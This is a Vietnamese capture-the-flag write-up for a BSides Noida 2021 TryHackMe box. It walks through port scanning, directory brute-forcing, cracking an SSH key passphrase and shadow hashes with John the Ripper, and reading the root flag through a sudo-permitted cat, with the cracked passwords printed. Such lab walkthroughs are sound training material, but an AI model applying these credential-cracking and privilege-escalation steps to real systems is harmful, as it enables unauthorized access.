---
title : "[Writeup] BSides Noida CTF 2021 - Deathnote"
author : "F4c3l3ss_"
date : 2021-08-08
tags : ["forensics","writeup","BSides"]
categories: [Writeup, BSides Noida CTF 2021]
---

Bài này cho chúng ta 1 vuln box trên tryhackme và nhiệm vụ là phải cat được flag trong root folder.

Đầu tiên, mình dùng nmap để xem các port đang mở trên box này.
```bash
$ nmap -vv -sV -sT -sC 10.10.164.150

Nmap scan report for 10.10.164.150
Host is up, received syn-ack (0.38s latency).
Scanned at 2021-08-08 17:01:46 +07 for 70s
Not shown: 997 closed ports
Reason: 997 conn-refused
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            49 Aug 01 05:41 info.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.4.25.179
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:c4:7a:64:fc:07:9f:c7:1c:a1:6e:f2:3c:57:b3:89 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQ+N9q4k+biVq4CGIWzpEtEPRDO/unGV2snbUl1hT1+JIo7mPL53HQCXgLfcL+9ERgGlusCHX2C2E/0XFdpTVzJgvgwXphvBjL7E20hprdVxGdZREeN46e7VgopcMC9uajiOW82JM0jdg2nqc0GGU5G4sKOo8/pXBFySI80TrXnffLzK4CWpMRnxPqFf6DGG7kwq8MDRdY1hZR/4yPZWpqklUSXOTX71/uqZbvUze2z234No9+nEl3R/fbeU6cKyZ9jzVrPZAlBHrfYCnZKBnjjODsAAW5q61omK/uRbsST1ZEmKnvRSd2VEfs+ZrPTNhu54jBOFc6crLbYPukDOpB
|   256 1d:a4:c9:b6:3d:4c:e7:61:d7:7a:e0:d2:f5:fb:84:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCNpTWvYwESpI0LH38YBg53wz0AGJNsxmqBAVSTNjJePODVLShMHunBSYZYbQf0lyoJ50lWItH4w9R0Bh9sOxSY=
|   256 43:c8:92:9b:02:4f:4f:e7:6a:38:9a:83:32:50:25:69 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJjZEe7mwBDbmCiOXQ8mMWt3WyKXXBd8iBDVodpUWE1t
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: BSidesNoida2021
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Ta thấy rằng box đang mở dịch vụ ftp ở port 21 và không có cơ chế xác thực, port 22 chạy dịch vụ ssh, và port 80 chạy http.

Mình thử truy cập port 21 để xem có lấy được file gì không thì chỉ nhận được 1 file `info.txt` không có thông tin gì.

```bash
$ cat info.txt 
you know how to find secret files :P
Have Fun :)
```

Tiếp đến dịch vụ HTTP, chỉ là một trang web bình thường, viewsource thì tác giả có hint bằng dòng comment: `<!-- Don't touch my s3cr3t file-->`. Vậy thì làm thế nào để get được file s3cr3t này? Trong mục miêu tả của box tác giả cung cấp cho ta một file wordlist.txt nên mình tải về và dò tìm xem các URI khác của box bằng `gobuster`.

```bash
$ gobuster dir -w wordlist.txt -u 10.10.164.150                                                                                                 1 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.164.150
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                wordlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 4173]
/s3cr3t               (Status: 200) [Size: 63]  
/ryuk.apples          (Status: 200) [Size: 1766]
/robots.txt           (Status: 200) [Size: 17]  
/robots.txt           (Status: 200) [Size: 17]  
/server-status        (Status: 403) [Size: 278] 
```

Truy cập trang `ryuk.apples` cho ta một file private key dùng cho việc kết nối SSH và đã encrypt, việc cần làm là phải cần dò passphase cho file pem này để thực hiện kết nối SSH.

```bash
$ wget https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py
$ python ssh2john.py ryuk.apples > pem.hash
$ john --wordlist=wordlist.txt pem.hash                                                                                                      130 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
l1ght1skir4      (ryuk.apples)
1g 0:00:00:00 DONE (2021-08-08 17:15) 100.0g/s 461400p/s 461400c/s 461400C/s zone..zt
Session completed
```

Sau khi có được passphase mình thật sự không biết username để truy cập là gì, cũng nhờ đứa em wibu nó thông não ryuk là thần chết trong deathnote tương tự như tên đề bài. Đoạn passphase cho file SSH cũng là password login cho user ryuk.

Nhưng trên box thì user ryuk không có quá nhiều thông tin cũng như không thuộc group sudo và không có ứng dụng nào thực thi dưới quyền sudo cho user. Một mặt, tác giả cho ta 2 file passwd và shadow trên thư mục của home của ryuk nên mình ngó thử xem sao.
```bash
$ cat /etc/passwd       
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
avahi-autoipd:x:106:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
rtkit:x:109:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
whoopsie:x:111:117::/nonexistent:/bin/false
kernoops:x:112:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:113:119::/var/lib/saned:/usr/sbin/nologin
pulse:x:114:120:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
avahi:x:115:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
colord:x:116:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
hplip:x:117:7:HPLIP system user,,,:/var/run/hplip:/bin/false
geoclue:x:118:124::/var/lib/geoclue:/usr/sbin/nologin
gnome-initial-setup:x:119:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:120:125:Gnome Display Manager:/var/lib/gdm3:/bin/false
mrgrep:x:1000:1000:BSidesNoida,,,:/home/mrgrep:/bin/bash
ftp:x:121:127:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
ryuk:x:1001:1001::/home/ryuk:/bin/sh
sshd:x:122:65534::/run/sshd:/usr/sbin/nologin
light:x:1002:1002::/home/light:/bin/sh
```

Chú ý đến user light, có thể sẽ có gì đó hay ho cho user này để mình leo lên quyền root. Từ file shadow, passwd đã cho, mình hoàn toàn có thể lấy được password của user light.

```bash
$ unshadow passwd shadow > pass
$ john --wordlist=wordlist.txt pass                                                                                                             1 ⨯
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
MrBS1d3sGrepN0ida@!1337 (light)
l1ght1skir4      (ryuk)
Warning: Only 6 candidates left, minimum 8 needed for performance.
2g 0:00:00:05 DONE (2021-08-08 11:17) 0.3539g/s 816.6p/s 2040c/s 2040C/s zone..zt
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Sau khi SSH của user light, mình thử `sudo -l` để xem có lệnh nào có thể sử dụng để leo lên root được không.
```bash
$ sudo -l
Matching Defaults entries for light on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User light may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
```

Oh well ✪ ω ✪
```bash
$ sudo cat /root/root.txt
BSNoida{Pr1vEsc_w4a_E4sy_P3a5y}
```

Cheer (☞ﾟヮﾟ)☞ ☜(ﾟヮﾟ☜)

